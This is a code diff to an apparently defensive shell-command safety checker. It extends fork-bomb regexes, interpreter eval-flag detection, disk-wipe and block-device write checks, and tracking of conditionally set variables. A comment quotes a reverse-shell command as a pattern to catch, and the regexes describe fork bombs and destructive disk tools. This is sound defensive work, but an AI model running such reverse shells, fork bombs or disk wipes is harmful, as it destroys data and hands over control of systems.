@@ -33,6 +33,7 @@ HARDLINE_PATTERNS: list[tuple[str, str]] = [
         "fork-bomb",
         r"(?:\b(\w+)\s*\(\)\s*\{\s*\1\s*\|\s*\1\s*&\s*\}"
         r"|\bfunction\s+(\w+)\s*(?:\(\))?\s*\{\s*\2\s*\|\s*\2\s*&\s*\}"
+        r"|\b(\w+)\s*\(\)\s*\{\s*\3\s*&\s*\3\s*;?\s*\}"
         r"|:\s*\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\})",
     ),
     # bash's network redirects: the usual reverse shell (`bash -i >& /dev/tcp/HOST/PORT 0>&1`)
@@ -451,6 +452,7 @@ def _check_parse(
 def _check_parsed(parsed: Parsed, extra: list[str] | None, dirs: _Dirs) -> str | None:
     # relative rm/find targets are read in every directory the sub may run in, followed through the line (see _Dirs)
     home = dirs.home
+    dirs.cond |= _conditional_names(parsed.clean)
     need = {k for ks in parsed.child_subs for k in ks}
     where: dict[int, _Where] = {}  # the directories of the subs a child came from, taken at that sub
     fetched: set[str] = set()  # files an earlier command of the line downloaded (see _download_run_check)
@@ -471,7 +473,7 @@ def _check_parsed(parsed: Parsed, extra: list[str] | None, dirs: _Dirs) -> str |
             or _git_push_check(argv)
             or _env_dump_check(sub)
             or _fetch_run_check(argv, parsed.sub_payloads[k])
-            or _destroy_check(argv, sub, home)
+            or _destroy_check(argv, sub, home, dirs)
             or _download_run_check(argv, fetched)
             or (sargv is not argv and (_rm_check(sargv, dirs, home) or _git_push_check(sargv)))
         )
@@ -1281,8 +1283,13 @@ def _xargs_runs_input_as_code(words: list[str]) -> bool:
             placeholders.add(w.partition("=")[2])
         if _is_interpreter(os.path.basename(w)):
             tail = words[i + 1 :]
-            flag = next(
-                (j for j, a in enumerate(tail) if a.startswith("-") and not a.startswith("--") and a.endswith("c")),
+            flag = next(  # -c (shells), -e / -E (perl, ruby, node), -r (php), or the long forms
+                (
+                    j
+                    for j, a in enumerate(tail)
+                    if (a.startswith("-") and not a.startswith("--") and a[-1] in "ceEr")
+                    or a in ("--eval", "--print", "--command")
+                ),
                 None,
             )
             if flag is None:
@@ -1650,6 +1657,7 @@ class _Dirs:
         self.overflow = overflow or len(self.all) > _CD_MAX_DIRS
         self._stack: list[str | None] = []  # pushd's directory stack, for popd
         self.known: dict[str, tuple[str, ...]] = {}  # variables the line set to a literal (see _note_vars)
+        self.cond: set[str] = set()  # variables the line assigns where it may not run (see _conditional_names)
 
     def where(self) -> _Where:
         return _Where(tuple(self.all), self.overflow, self.here, tuple(self.known.items()))
@@ -1665,6 +1673,7 @@ class _Dirs:
         overflow = any(w.overflow for w in wheres)
         child = _Dirs(start, here, self.home, self.cdpath, overflow=overflow)
         child.known = _merge_known([dict(w.known) for w in wheres])
+        child.cond = set(self.cond)
         return child
 
     def _add(self, d: str) -> None:
@@ -1677,7 +1686,7 @@ class _Dirs:
     def follow(self, argv: list[str], sub: str) -> None:
         """Take in the simple command ``argv`` (read from the text ``sub``) if it changes directory (cd, pushd,
         popd)."""
-        _note_vars(self.known, _tokens(sub), argv)
+        _note_vars(self.known, _tokens(sub), argv, self.cond)
         name = argv[0] if argv else ""
         if self.overflow:
             return  # every later relative delete is scan-depth: where the line goes no longer matters
@@ -1869,14 +1878,32 @@ _BLOCK_DEVICE = re.compile(
     r"(?:p?\d+)?$"
 )
 #: Programs that repartition, relabel or wipe the device they are given, and the read-only options that only list it.
+#: The tool is read-only only when EVERY flag it is given is in its set (an allowlist: a destructive flag next to a
+#: listing one, as in ``sgdisk -p -Z``, or no flag at all, as in ``sfdisk < table``, is a write).
 _DISK_TOOLS: dict[str, frozenset[str]] = {
     "mkswap": frozenset(),
     "shred": frozenset(),
     "blkdiscard": frozenset(),
-    "sfdisk": frozenset({"-l", "--list", "-s", "--show-size", "-d", "--dump", "-J", "--json", "-g", "-V", "--verify"}),
+    "sfdisk": frozenset(
+        {
+            "-l",
+            "--list",
+            "-s",
+            "--show-size",
+            "-d",
+            "--dump",
+            "-J",
+            "--json",
+            "-g",
+            "-V",
+            "--verify",
+            "-F",
+            "--list-free",
+        }
+    ),
     "fdisk": frozenset({"-l", "--list", "-s"}),
     "gdisk": frozenset({"-l"}),
-    "sgdisk": frozenset({"-p", "--print", "-l", "--load-backup", "-E", "--end-of-largest", "-v", "--verify"}),
+    "sgdisk": frozenset({"-p", "--print", "-v", "--verify", "-i", "--info", "-E", "--end-of-largest", "-L", "-V"}),
 }
 _PARTED_WRITES = frozenset({"mklabel", "mktable", "mkpart", "mkpartfs", "rm", "resizepart", "resize", "move", "name"})
 #: The word after a redirect operator: quoted pieces and plain characters up to a space or an operator.
@@ -1929,53 +1956,93 @@ _WRITES_ALL = frozenset({"tee", "truncate", "sponge"})
 _WRITES_LAST = frozenset({"cp", "mv", "install"})
 
 
-def _block_device_check(argv: list[str], sub: str) -> str | None:
+def _flag_set(args: list[str]) -> set[str]:
+    """The flags among ``args``, a cluster of short ones taken apart (``-af`` is ``-a`` and ``-f``), a long one without
+    its ``=value``."""
+    out: set[str] = set()
+    for a in args:
+        if a == "--":
+            break
+        if a.startswith("--"):
+            out.add(a.partition("=")[0])
+        elif a.startswith("-") and len(a) > 1:
+            out.update("-" + c for c in a[1:])
+    return out
+
+
+def _is_block_device(path: str) -> bool:
+    # /dev//sda, //dev/sda, /dev/./sda and /dev/../dev/sda are /dev/sda (normpath keeps a leading //, so collapse first)
+    return bool(_BLOCK_DEVICE.match(os.path.normpath(re.sub(r"/{2,}", "/", path))))
+
+
+def _block_device_check(argv: list[str], sub: str, known: dict[str, tuple[str, ...]]) -> str | None:
     """Output redirected onto a disk, or a program that wipes, relabels or copies onto one. ``sub`` is the simple
-    command's text with the redirections still in (``argv`` is its normalised program and arguments)."""
+    command's text with the redirections still in (``argv`` is its normalised program and arguments); ``known`` the
+    variables the line set (``D=/dev/sda; cat x > $D``)."""
     for target in _out_redirect_targets(sub):
-        if _BLOCK_DEVICE.match(target):
+        if any(_is_block_device(t) for t in _resolve_target(target, known)):
             return "block-device-write"
     if not argv:
         return None
     name, args = os.path.basename(argv[0]), _without_redirects(argv[1:])
-    devices = [a for a in args if _BLOCK_DEVICE.match(a)]
+    args = [r for a in args for r in _resolve_target(a, known)]
+    devices = [a for a in args if _is_block_device(a)]
     if not devices:
         return None
+    flags = _flag_set(args)
     if name in _DISK_TOOLS:
-        return None if _DISK_TOOLS[name] & set(args) else "block-device-write"
-    if name == "parted":
-        return "block-device-write" if _PARTED_WRITES & set(args) else None
+        return None if flags and flags <= _DISK_TOOLS[name] else "block-device-write"
+    if name == "parted":  # the subcommand may be one quoted word with its arguments (`'mklabel gpt'`)
+        return "block-device-write" if _PARTED_WRITES & {w for a in args for w in a.split()} else None
     if name == "wipefs":  # lists signatures unless told to erase them (-n / --no-act is the dry run)
-        erase = {"-a", "--all", "-o", "--offset"} & set(args)
-        return "block-device-write" if erase and not {"-n", "--no-act"} & set(args) else None
+        erase = flags & {"-a", "--all", "-o", "--offset"}
+        return "block-device-write" if erase and not flags & {"-n", "--no-act"} else None
     operands = [a for a in args if not a.startswith("-")]
     if name in _WRITES_ALL and devices:
         return "block-device-write"
-    if name in _WRITES_LAST and operands and _BLOCK_DEVICE.match(operands[-1]):
+    if name in _WRITES_LAST and operands and _is_block_device(operands[-1]):
         return "block-device-write"
     return None
 
 
-def _destroy_check(argv: list[str], sub: str, home: str) -> str | None:
-    """Recursive chmod/chown/chgrp on /, ~ or $HOME, ``rsync --delete`` into one of them, and writes onto a disk."""
-    hit = _block_device_check(argv, sub)
+#: chmod's own options: any other word that starts with ``-`` (``-w``, ``-x``, ``-rwx``) is a symbolic mode.
+_CHMOD_OPTION = re.compile(r"^-[RfvcHLPh]+$")
+
+
+def _destroy_check(argv: list[str], sub: str, home: str, dirs: _Dirs) -> str | None:
+    """Recursive chmod/chown/chgrp on /, ~ or $HOME (relative targets read where the line may be, variables as the line
+    set them), ``rsync --delete`` into one of them, and writes onto a disk."""
+    hit = _block_device_check(argv, sub, dirs.known)
     if hit or not argv:
         return hit
     name, args = os.path.basename(argv[0]), _without_redirects(argv[1:])
     if name in ("chmod", "chown", "chgrp"):
-        recursive = any(a == "--recursive" or (a.startswith("-") and not a.startswith("--") and "R" in a) for a in args)
-        positional = [a for a in args if not a.startswith("-")]
+        recursive, past = False, False
+        positional: list[str] = []
+        for a in args:
+            if past:
+                positional.append(a)
+            elif a == "--":
+                past = True
+            elif a.startswith("--"):
+                recursive = recursive or a == "--recursive"
+            elif a.startswith("-") and len(a) > 1 and (name != "chmod" or _CHMOD_OPTION.match(a)):
+                recursive = recursive or "R" in a
+            else:
+                positional.append(a)  # for chmod a minus-form mode (-w, -x) is the first of these
         targets = positional if any(a.startswith("--reference") for a in args) else positional[1:]
         if recursive:
-            for t in targets:
-                if t.startswith(("/", "~", "$")) and _delete_target_rule(t, None, home):
+            for t in (r for raw in targets for r in _resolve_target(raw, dirs.known)):
+                if _delete_rule_in(t, dirs, home):
                     return f"{name}-recursive-root"
     elif name == "rsync" and any(a == "--del" or a.startswith("--delete") for a in args):
         operands = [a for a in args if not a.startswith("-")]
         dest = operands[-1] if len(operands) > 1 else ""
         remote = ":" in dest.split("/", 1)[0]  # host:path is another machine's
-        if not remote and dest.startswith(("/", "~", "$")) and _delete_target_rule(dest, None, home):
-            return "rsync-delete-root"
+        if not remote:
+            for t in _resolve_target(dest, dirs.known):
+                if t and _delete_rule_in(t, dirs, home):  # a relative destination is read where the line may be
+                    return "rsync-delete-root"
     return None
 
 
@@ -2066,6 +2133,21 @@ _NAMED_WRITERS = frozenset({"read", "mapfile", "readarray", "unset", "getopts", 
 _ANY_WRITERS = frozenset({"eval", "source", "."})
 
 
+#: Every ``NAME=`` that starts a word, and the ones that are a statement of their own at the top level of the line
+#: (``X=/;``, ``X=/`` at the start or end, one per line): only those are certain to run, in order, and to stay.
+_ANY_ASSIGN = re.compile(r"(?:^|(?<=[\s;&|(){]))(\w+)\+?=")
+_PLAIN_ASSIGN = re.compile(r"(?:^|(?<=[;\n]))[ \t]*(\w+)\+?=\S*[ \t]*(?=;|\n|$)")
+
+
+def _conditional_names(clean: str) -> set[str]:
+    """The variables the command line assigns anywhere but as a plain top-level statement (after ``&&`` / ``||``, in a
+    ``then`` / ``else`` / ``do`` branch, a ``case`` arm, a function body, a ``( ... )`` or ``{ ... }`` group, a pipeline
+    stage, a background command, ahead of a command): that assignment may not run, or may not stay. An assignment to one
+    of them keeps the values the variable held before and adds "unknown", instead of replacing them."""
+    plain = {m.start(1) for m in _PLAIN_ASSIGN.finditer(clean)}
+    return {m.group(1) for m in _ANY_ASSIGN.finditer(clean) if m.start(1) not in plain}
+
+
 def _merge_known(snapshots: list[dict[str, tuple[str, ...]]]) -> dict[str, tuple[str, ...]]:
     """What the line may have set at any of several points (a substitution that came from more than one sub): a
     variable holds every value any of them gave it."""
@@ -2076,7 +2158,12 @@ def _merge_known(snapshots: list[dict[str, tuple[str, ...]]]) -> dict[str, tuple
     return merged
 
 
-def _note_vars(known: dict[str, tuple[str, ...]], tokens: list[str], argv: list[str]) -> None:
+def _note_vars(
+    known: dict[str, tuple[str, ...]],
+    tokens: list[str],
+    argv: list[str],
+    conditional: set[str] | frozenset[str] = frozenset(),
+) -> None:
     """Record what the simple command ``tokens`` assigns, so a later delete of ``$X`` is read as what it holds:
     ``X=/``, ``Y=$X`` (a copy of a known one), ``export X=/``, ``for X in a b``. A value the shell computes
     (``X=$(..)``, ``for X in *``) is forgotten. ``read X``, ``unset X``, ``printf -v X``, ``let X=..`` and
@@ -2126,7 +2213,9 @@ def _note_vars(known: dict[str, tuple[str, ...]], tokens: list[str], argv: list[
         name, _, value = w.partition("=")
         values = _resolve_target(value, known)
         good = [v for v in values if _KNOWN_VALUE.match(v)]
-        if good and len(good) == len(values):
+        if name in conditional:  # this assignment may not run: what X held stays possible, and so does "unset"
+            known[name] = tuple(dict.fromkeys((*known.get(name, ()), *good, _UNKNOWN)))
+        elif good and len(good) == len(values):
             known[name] = tuple(values)
         elif good:  # a copy of a variable that may also hold something unknown
             known[name] = (*good, _UNKNOWN)
@@ -2230,7 +2319,8 @@ def _human_sub(argv: list[str], known: dict[str, tuple[str, ...]]) -> str | None
     return None
 
 
-def _human_parsed(parsed: Parsed, known: dict[str, tuple[str, ...]]) -> str | None:
+def _human_parsed(parsed: Parsed, known: dict[str, tuple[str, ...]], cond: frozenset[str] = frozenset()) -> str | None:
+    cond = cond | _conditional_names(parsed.clean)
     need = {k for ks in parsed.child_subs for k in ks}
     at: dict[int, dict[str, tuple[str, ...]]] = {}  # the variables at each sub a child came from
     for k, sub in enumerate(parsed.subs):
@@ -2242,10 +2332,10 @@ def _human_parsed(parsed: Parsed, known: dict[str, tuple[str, ...]]) -> str | No
         hit = _human_sub(argv if spelled == sub else _command_argv(_tokens(spelled)), known)
         if hit:
             return hit
-        _note_vars(known, tokens, argv)
+        _note_vars(known, tokens, argv, cond)
     for child, ks in zip(parsed.children, parsed.child_subs, strict=True):
         seen = [at[k] for k in ks if k in at]  # a substitution runs where it sits, not where the line ends
-        hit = _human_parsed(child, _merge_known(seen) if seen else dict(known))
+        hit = _human_parsed(child, _merge_known(seen) if seen else dict(known), cond)
         if hit:
             return hit
     return None
